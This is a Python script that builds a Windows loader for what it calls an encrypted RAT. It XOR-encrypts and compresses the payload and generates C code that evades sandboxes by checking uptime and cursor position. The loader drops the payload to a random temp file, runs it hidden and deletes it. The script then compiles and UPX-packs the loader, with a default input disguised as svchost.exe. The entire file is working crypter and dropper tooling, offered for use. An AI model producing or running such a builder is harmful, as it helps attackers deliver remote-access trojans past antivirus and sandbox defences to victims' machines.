"""
C Loader Builder
Creates tiny EXE (under 1 MB) with encrypted RAT
"""

import os
import sys
import subprocess
import shutil
import random
import string
import zlib
import base64
import struct
from pathlib import Path

def generate_random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def create_c_loader(original_exe_path, output_dir):
    print("Reading original EXE...")
    with open(original_exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Original size: {len(exe_data) / (1024*1024):.1f} MB")
    
    print("Compressing...")
    compressed = zlib.compress(exe_data, level=9)
    print(f"Compressed size: {len(compressed) / (1024*1024):.1f} MB")
    
    print("Encrypting...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(compressed):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Convert to hex for C array
    data_hex = encrypted.hex()
    key_hex = key.hex()
    
    print("Generating C loader...")
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <zlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/SECTION:.data,EWR")
#pragma comment(linker, "/NODEFAULTLIB:libcmt")
#pragma comment(linker, "/NODEFAULTLIB:msvcrt")

static const unsigned char encrypted_data[] = 
    "{data_hex}";
static const size_t data_len = {len(encrypted)};

static const unsigned char xor_key[] = 
    "{key_hex}";
static const size_t key_len = 32;

void xor_decrypt(unsigned char* data, size_t len) {{
    for(size_t i = 0; i < len; i++) {{
        data[i] ^= xor_key[i % key_len];
    }}
}}

unsigned char* decompress_data(const unsigned char* src, size_t src_len, size_t* out_len) {{
    uLongf dest_len = src_len * 20;
    unsigned char* dest = (unsigned char*)malloc(dest_len);
    if (!dest) return NULL;
    
    int result = uncompress(dest, &dest_len, src, src_len);
    if (result != Z_OK) {{
        free(dest);
        return NULL;
    }}
    
    *out_len = dest_len;
    return dest;
}}

void run_pe_from_memory(unsigned char* pe_data, size_t pe_size) {{
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    
    GetTempPathA(MAX_PATH, temp_path);
    
    // Generate random filename
    const char* chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    char filename[13];
    for(int i = 0; i < 12; i++) {{
        filename[i] = chars[rand() % 36];
    }}
    filename[12] = '\\0';
    sprintf(temp_file, "%s%s.exe", temp_path, filename);
    
    HANDLE hFile = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, 
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    DWORD written;
    WriteFile(hFile, pe_data, pe_size, &written, NULL);
    CloseHandle(hFile);
    
    STARTUPINFOA si = {{sizeof(si)}};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    CreateProcessA(temp_file, NULL, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW | DETACHED_PROCESS,
                   NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    // Delete after 5 seconds
    Sleep(5000);
    DeleteFileA(temp_file);
}}

BOOL check_sandbox() {{
    if (GetTickCount64() < 300000) return FALSE;
    
    POINT pt;
    GetCursorPos(&pt);
    if (pt.x == 0 && pt.y == 0) return FALSE;
    
    return TRUE;
}}

int main() {{
    if (!check_sandbox()) return 0;
    
    unsigned char* decrypted = (unsigned char*)malloc(data_len);
    if (!decrypted) return 1;
    
    memcpy(decrypted, encrypted_data, data_len);
    xor_decrypt(decrypted, data_len);
    
    size_t exe_size;
    unsigned char* exe_data = decompress_data(decrypted, data_len, &exe_size);
    free(decrypted);
    
    if (!exe_data) return 1;
    
    run_pe_from_memory(exe_data, exe_size);
    free(exe_data);
    
    return 0;
}}
'''
    
    loader_name = f'loader_{generate_random_string()}.c'
    loader_path = os.path.join(output_dir, loader_name)
    with open(loader_path, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print(f"C loader created: {loader_name}")
    return loader_path

def compile_c_loader(loader_path, output_dir):
    print("Compiling C loader with MinGW...")
    
    output_exe = os.path.join(output_dir, f'loader_{generate_random_string()}.exe')
    
    # Try to find gcc
    gcc_paths = [
        'gcc',
        'mingw32-gcc',
        'x86_64-w64-mingw32-gcc',
        'i686-w64-mingw32-gcc',
        r'C:\msys64\mingw64\bin\gcc.exe',
        r'C:\msys64\mingw32\bin\gcc.exe',
        r'C:\mingw64\bin\gcc.exe',
        r'C:\mingw\bin\gcc.exe',
    ]
    
    gcc = None
    for path in gcc_paths:
        try:
            subprocess.run([path, '--version'], capture_output=True, check=True)
            gcc = path
            break
        except:
            continue
    
    if not gcc:
        print("GCC not found, trying MSVC...")
        return compile_with_msvc(loader_path, output_dir)
    
    cmd = [
        gcc,
        loader_path,
        '-o', output_exe,
        '-O3',
        '-s',
        '-static',
        '-lz',
        '-fno-exceptions',
        '-fno-rtti',
        '-fno-stack-protector',
        '-fvisibility=hidden',
        '-Wl,--gc-sections',
        '-Wl,--strip-all',
        '-Wl,--subsystem,windows',
        '-Wl,--no-insert-timestamp',
        '-Wl,--merge-identical-sections',
        '-Wl,--discard-all',
        '-Wl,-s',
        '-mwindows',
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        return output_exe
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr}")
        return None

def compile_with_msvc(loader_path, output_dir):
    print("Compiling with MSVC...")
    
    output_exe = os.path.join(output_dir, f'loader_{generate_random_string()}.exe')
    
    cmd = [
        'cl',
        '/nologo',
        '/O2',
        '/GS-',
        '/MT',
        '/DNDEBUG',
        '/W0',
        '/link',
        '/NOLOGO',
        '/SUBSYSTEM:WINDOWS',
        '/ENTRY:mainCRTStartup',
        '/OUT:' + output_exe,
        loader_path,
        'zlib.lib'
    ]
    
    try:
        subprocess.run(cmd, check=True, capture_output=True)
        return output_exe
    except:
        return None

def compress_with_upx(exe_path):
    print("Compressing with UPX...")
    try:
        result = subprocess.run(
            ['upx', '--best', '--ultra-brute', exe_path],
            capture_output=True,
            text=True
        )
        if result.returncode == 0:
            print("UPX compression successful")
            return True
    except:
        pass
    return False

def build_loader(original_exe_path):
    print("=" * 60)
    print("C RAT LOADER BUILDER")
    print("=" * 60)
    
    if not os.path.exists(original_exe_path):
        print(f"File not found: {original_exe_path}")
        return None
    
    output_dir = os.path.dirname(original_exe_path)
    
    loader_c = create_c_loader(original_exe_path, output_dir)
    
    loader_exe = compile_c_loader(loader_c, output_dir)
    
    if not loader_exe:
        print("Compilation failed")
        return None
    
    compress_with_upx(loader_exe)
    
    original_size = os.path.getsize(original_exe_path) / (1024 * 1024)
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Path: {loader_exe}")
    print(f"Original size: {original_size:.1f} MB")
    print(f"Loader size: {final_size:.1f} MB")
    print(f"Compression ratio: {final_size/original_size*100:.1f}%")
    print(f"Saved: {original_size - final_size:.1f} MB")
    print("=" * 60)
    
    try:
        os.remove(loader_c)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/svchost.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_loader(exe_path)
